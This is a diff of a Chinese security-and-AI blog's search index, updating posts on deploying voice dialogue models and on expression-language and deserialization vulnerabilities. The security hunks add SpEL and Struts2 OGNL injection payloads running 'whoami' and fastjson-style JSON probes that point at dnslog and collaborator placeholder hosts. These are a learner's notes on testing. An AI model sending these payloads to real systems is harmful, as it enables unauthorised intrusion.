@@ -76,14 +76,18 @@
   <entry>
     <title>端到端语音对话模型</title>
     <url>/2026/02/07/%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%AF%AD%E9%9F%B3%E5%AF%B9%E8%AF%9D%E6%A8%A1%E5%9E%8B/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>端到端语音对话模型的github项目：<br><a href="https://github.com/zai-org/GLM-4-Voice">https://github.com/zai-org/GLM-4-Voice</a></p>
-<p><a href="https://github.com/gpt-omni/mini-omni2">https://github.com/gpt-omni/mini-omni2</a></p>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>端到端语音对话模型的<code>github</code>项目：<br><a href="https://github.com/zai-org/GLM-4-Voice">GLM-4-Voice</a>、<a href="https://github.com/gpt-omni/mini-omni2">mini-omni2</a>、<a href="https://github.com/ictnlp/LLaMA-Omni2">LLaMA-Omni2</a></p>
 <p><strong>端到端语音对话模型</strong>是指一种直接从原始语音输入生成对应语音或文本响应的完整人工智能系统。它的核心思想是<strong>用一个统一的模型处理整个对话流程</strong>，而不是依赖多个独立的模块拼接</p>
+<p>注：omni代表“全模态”；</p>
+<p><strong>“Omni” 模型的不同之处在于：</strong> 它把所有模态（听、说、读、写、看）全部塞进了一个大脑里进行<strong>端到端（End-to-End）</strong>处理。它直接理解音频信号，直接生成音频流。</p>
 <p>一块30系列的<code>8G</code>显卡正好能运行量化版本<code>int4</code>	</p>
 <span id="more"></span>
 
 <h1 id="1-mini-omni2"><a href="#1-mini-omni2" class="headerlink" title="1-mini-omni2"></a>1-mini-omni2</h1><p><code>conda</code>拉取完直接跑就行服务和网页即可</p>
-<h1 id="2-GLM-4-Voice"><a href="#2-GLM-4-Voice" class="headerlink" title="2-GLM-4-Voice"></a>2-GLM-4-Voice</h1><p>部署出现较多环境错误，记录部分版本如下：</p>
+<h6 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h6><p>回答迅速，有现成的客户端能直接实现快速应答</p>
+<h6 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h6><p>国内使用，目前听得懂中文，但生成不了中文</p>
+<h1 id="2-GLM-4-Voice"><a href="#2-GLM-4-Voice" class="headerlink" title="2-GLM-4-Voice"></a>2-GLM-4-Voice</h1><p>#自己的单卡显卡性能跑这玩意回复要<code>15s</code>左右</p>
+<p>部署出现较多环境错误，记录部分版本如下：</p>
 <p><code>python3.10</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install transformers==4.45.0 accelerate==0.34.0 bitsandbytes==0.43.3</span><br><span class="line">#强制对齐版本</span><br><span class="line">pip install torchaudio --index-url https://download.pytorch.org/whl/cu121</span><br><span class="line">pip install torch torchaudio --index-url https://download.pytorch.org/whl/cu121 --force-reinstall</span><br></pre></td></tr></table></figure>
 
@@ -91,31 +95,58 @@
 <thead>
 <tr>
 <th><strong>库名称</strong></th>
-<th><strong>推荐版本 (修复你的报错)</strong></th>
-<th><strong>说明</strong></th>
+<th>**版本 **</th>
 </tr>
 </thead>
 <tbody><tr>
 <td><strong>transformers</strong></td>
 <td><code>4.45.0</code></td>
-<td>解决之前的 <code>all_tied_weights</code> 报错</td>
 </tr>
 <tr>
 <td><strong>huggingface_hub</strong></td>
 <td><code>0.24.7</code></td>
-<td>解决当前的 <code>cached_download</code> 报错</td>
 </tr>
 <tr>
 <td><strong>ruamel.yaml</strong></td>
 <td><code>&lt;0.18.0</code></td>
-<td>解决之前的 <code>max_depth</code> 报错</td>
 </tr>
 <tr>
 <td><strong>torchaudio</strong></td>
 <td>与 <code>torch</code> 匹配</td>
-<td>解决之前的 <code>OSError</code> 符号报错</td>
 </tr>
 </tbody></table>
+<h1 id="2-LLaMA-Omni2"><a href="#2-LLaMA-Omni2" class="headerlink" title="2-LLaMA-Omni2"></a>2-LLaMA-Omni2</h1><p>#比较适用，现成的客户端还支持流式更新，推荐客户端：<a href="https://github.com/tc-mb/llama.cpp-omni"><code>llama.cpp-omni</code></a>(全双工语音交互客户端)</p>
+<p>因为它属于基于 <code>LLM</code> 的多模态语音模型，所以可以给 <code>LLaMA-Omni2</code> 添加向量数据库（RAG, 检索增强生成）可以让模型基于个人的知识库回答问题，而不需要重新训练模型，可以在客户端跑检索条件，避免浪费服务器算力。</p>
+<h2 id="1-身份赋予"><a href="#1-身份赋予" class="headerlink" title="1&gt;身份赋予"></a>1&gt;身份赋予</h2><p>①**<code>process_messages</code>** 是将“对话列表”转换为模型能理解的“数字序列（Tokens）”的核心中转站</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/LLaMA-Omni2/llama_omni2/serve/model_worker.py：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_messages</span>(<span class="params">self, messages</span>):</span><br><span class="line">    <span class="comment"># 1. 验证对话完整性</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(messages) % <span class="number">2</span> == <span class="number">1</span>, <span class="string">&quot;Number of history messages must be odd&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 应用聊天模板 (关键步骤)</span></span><br><span class="line">    input_ids = <span class="variable language_">self</span>.tokenizer.apply_chat_template(</span><br><span class="line">        messages, </span><br><span class="line">        add_generation_prompt=<span class="literal">True</span>, </span><br><span class="line">        return_tensors=<span class="string">&quot;pt&quot;</span></span><br><span class="line">    )[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 语音标识符替换</span></span><br><span class="line">    input_ids[input_ids == <span class="variable language_">self</span>.tokenizer.convert_tokens_to_ids(DEFAULT_SPEECH_TOKEN)] = SPEECH_TOKEN_INDEX</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> input_ids</span><br></pre></td></tr></table></figure>
+
+<p>②每段前插入一个系统用户的文字</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --- 在这里插入你的个性化身份 ---</span></span><br><span class="line">    custom_messages = [</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个名为&#x27;xxxx&#x27;的私人助手&quot;</span>&#125;</span><br><span class="line">    ] + messages </span><br><span class="line">    <span class="comment"># -----------------------------</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 应用聊天模板 (关键步骤)</span></span><br><span class="line">    input_ids = <span class="variable language_">self</span>.tokenizer.apply_chat_template(</span><br><span class="line">        custom_messages, </span><br><span class="line">        add_generation_prompt=<span class="literal">True</span>, </span><br><span class="line">        return_tensors=<span class="string">&quot;pt&quot;</span></span><br><span class="line">    )[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-添加向量数据库"><a href="#2-添加向量数据库" class="headerlink" title="2&gt;添加向量数据库"></a>2&gt;添加向量数据库</h2><h3 id="①后台同步转写"><a href="#①后台同步转写" class="headerlink" title="①后台同步转写"></a>①后台同步转写</h3><p>输入（如果是语音，需转为文本—多一个步骤）拿去向量数据库检索，检索出来的内容拼接到<code>Prompt</code>里面</p>
+<h3 id="②语义向量直接匹配"><a href="#②语义向量直接匹配" class="headerlink" title="②语义向量直接匹配"></a>②语义向量直接匹配</h3><p>非常炸裂，将概念的文字转换成抽象的感觉再去匹配</p>
+<h3 id="两者方案对比"><a href="#两者方案对比" class="headerlink" title="两者方案对比"></a>两者方案对比</h3><p>**CLAP (纯向量方案)**：处理 5 秒音频大约需要 <strong>20-50ms</strong>。</p>
+<p>**Whisper Tiny (转写方案)**：处理 5 秒音频大约需要 <strong>50-100ms</strong>。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>语义向量直接匹配</th>
+<th>语音文字转写匹配</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>优点</td>
+<td>极快，超越语言范畴</td>
+<td>延迟高，通用性强</td>
+</tr>
+<tr>
+<td>缺点</td>
+<td>构建难度高、纯电子音匹配低</td>
+<td>现有项目成熟、多语言要提升硬件</td>
+</tr>
+</tbody></table>
+<p>待续。。。</p>
 ]]></content>
       <categories>
         <category>Dialogue model</category>
@@ -157,14 +188,14 @@
     <url>/2026/02/04/%E5%B8%B8%E8%A7%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p><code>常见表达式</code></p>
 <p><strong>动态逻辑类：表达式语言 (Expression Language, EL)：</strong></p>
-<p><code>SpEL (Spring Expression Language)、OGNL (Object-Graph Navigation Language)、QL (Quick Language)</code></p>
+<p><code>SpEL (Spring Expression Language)、OGNL (Object-Graph Navigation Language)、QL(QLExpress)</code></p>
 <p> <strong>数据库逻辑类：SQL 表达式</strong></p>
 <p><strong>文本处理类：正则表达式</strong></p>
 <p><strong>定时任务类：Cron 表达式</strong></p>
 <p><strong>数据导航类：XPath 路径表达式</strong></p>
 <span id="more"></span>
 
-<h1 id="1-表达式语言"><a href="#1-表达式语言" class="headerlink" title="1-表达式语言"></a>1-表达式语言</h1><h3 id="危害：java代码执行"><a href="#危害：java代码执行" class="headerlink" title="危害：java代码执行"></a>危害：java代码执行</h3><p>蓝凌 <code>OA</code> 等 <code>Java</code> 系产品的很多漏洞都源于 **<code>SpEL 注入</code>**，攻击者可以通过特定的表达式直接执行 <code>java.lang.Runtime.getRuntime().exec()</code> 来拿下服务器权限</p>
+<h1 id="1-表达式语言"><a href="#1-表达式语言" class="headerlink" title="1-表达式语言"></a>1-表达式语言</h1><h3 id="危害：SpEL注入"><a href="#危害：SpEL注入" class="headerlink" title="危害：SpEL注入"></a>危害：SpEL注入</h3><p>蓝凌 <code>OA</code> 等 <code>Java</code> 系产品的很多漏洞都源于 **<code>SpEL 注入</code>**，攻击者可以通过特定的表达式直接执行 <code>java.lang.Runtime.getRuntime().exec()</code> 来拿下服务器权限</p>
 <p>常用的执行命令有：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#java.lang.ProcessBuilder</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;whoami&quot;</span>]).start();</span><br><span class="line">#java.lang.Runtime</span><br><span class="line">function <span class="title function_">test</span><span class="params">()</span>&#123; <span class="keyword">return</span> java.lang.Runtime&#125;;r=test();r.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>)</span><br></pre></td></tr></table></figure>
 
@@ -200,6 +231,12 @@
 <td>隐蔽性强，不直接依赖显式类</td>
 </tr>
 </tbody></table>
+<h3 id="危害：OGNL注入"><a href="#危害：OGNL注入" class="headerlink" title="危害：OGNL注入"></a>危害：OGNL注入</h3><p>示例：</p>
+<p><code>Apache Struts2</code> 框架早期版本（<strong>2.0.0 - 2.0.8</strong>）中的 <strong>OGNL 表達式注入</strong> 漏洞</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">%&#123;(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;))</span><br><span class="line">redirectErrorStream(<span class="literal">true</span>).start()&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="2-正则表达式"><a href="#2-正则表达式" class="headerlink" title="2-正则表达式"></a>2-正则表达式</h1><p><code>正则表达式不写注释简直是一串乱码，上午写的，下午就不认识了，但一般不会存在太大的漏洞</code></p>
 <h3 id="危害：ReDoS"><a href="#危害：ReDoS" class="headerlink" title="危害：ReDoS"></a><strong>危害：ReDoS</strong></h3><p>ReDoS（正则表达式拒绝服务攻击）<strong>危险示例：</strong> <code>^(a+)+$</code></p>
 <h3 id="危害：注入攻击"><a href="#危害：注入攻击" class="headerlink" title="危害：注入攻击"></a>危害：注入攻击</h3><p>正则表达式是<strong>动态构建</strong>且包含用户输入的，就可能引发信息泄露、逻辑绕过等风险，例如查询接口的<code>*</code>查询</p>
@@ -3443,7 +3480,7 @@
 <p><strong>注意：</strong></p>
 <p>如下是进行dnslog，即便collaborator有反应也不能说明存在RCE，只能说明存在dns解析</p>
 </blockquote>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxxcollaboratorxxxxxxxxxx.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxxcollaboratorxxxxxxxxxx.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -3572,6 +3609,7 @@
 <p>来测试是否存在jackson的反序列漏洞</p>
 <span id="more"></span>
 
+<p><strong>程序允许用户通过 JSON 指定类名，就相当于给黑客开了一扇进入 Java 内部世界的门</strong></p>
 <p>参考文章<a href="https://zhuanlan.zhihu.com/p/344568487">Jackson反序列化漏洞 - 知乎</a></p>
 <h3 id="Jackson-反序列化漏洞原理"><a href="#Jackson-反序列化漏洞原理" class="headerlink" title="Jackson 反序列化漏洞原理"></a>Jackson 反序列化漏洞原理</h3><h5 id="1-1-多态反序列化（Polymorphic-Deserialization）"><a href="#1-1-多态反序列化（Polymorphic-Deserialization）" class="headerlink" title="1.1 多态反序列化（Polymorphic Deserialization）"></a>1.1 多态反序列化（Polymorphic Deserialization）</h5><p>Jackson 支持将 JSON 自动反序列化为多种类型的 Java 对象，特别是当某字段的类型为 <code>Object</code>、接口或抽象类时，Jackson 允许通过类型信息确定具体类。</p>
 <h5 id="常见两种类型标识方式："><a href="#常见两种类型标识方式：" class="headerlink" title="常见两种类型标识方式："></a>常见两种类型标识方式：</h5><ul>
@@ -4898,10 +4936,14 @@
 </blockquote>
 </blockquote>
 <p><img src="/../image/web-js-freely/2.jpg"></p>
-<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;看得懂，会改，基本前端就没有什么秘密了</p>
+<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;能调试的前提下，深度混淆也能还原部分逻辑</p>
 <h3 id="1-高度混淆"><a href="#1-高度混淆" class="headerlink" title="[1]高度混淆"></a>[1]高度混淆</h3><h5 id="·1-启动器断点调试-堆栈溯源排查"><a href="#·1-启动器断点调试-堆栈溯源排查" class="headerlink" title="·1.启动器断点调试&#x2F;堆栈溯源排查"></a>·1.启动器断点调试&#x2F;堆栈溯源排查</h5><h6 id="工具："><a href="#工具：" class="headerlink" title="工具："></a><strong>工具：</strong></h6><ol>
-<li><strong>JavaScript Deobfuscator</strong> - 反混淆</li>
+<li><a href="https://github.com/ben-sb/javascript-deobfuscator">javascript-deobfuscator</a></li>
 <li><a href="https://github.com/jiyulany/Geetest-AST-">Geetest-AST-</a></li>
+</ol>
+<h6 id="网址："><a href="#网址：" class="headerlink" title="网址："></a><strong>网址：</strong></h6><ol>
+<li><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li>
+<li><a href="https://obf-io.deobfuscate.io/">https://obf-io.deobfuscate.io/</a></li>
 </ol>
 <h3 id="2-多层反调试"><a href="#2-多层反调试" class="headerlink" title="[2]多层反调试"></a>[2]多层反调试</h3><h5 id="·1-debugger反调试"><a href="#·1-debugger反调试" class="headerlink" title="·1.debugger反调试"></a>·1.debugger反调试</h5><p>​			忽略或者修改存在debugger的源代码即可</p>
 <h5 id="·2-调试强制清空内容"><a href="#·2-调试强制清空内容" class="headerlink" title="·2.调试强制清空内容"></a>·2.调试强制清空内容</h5><p>​			找到dom</p>
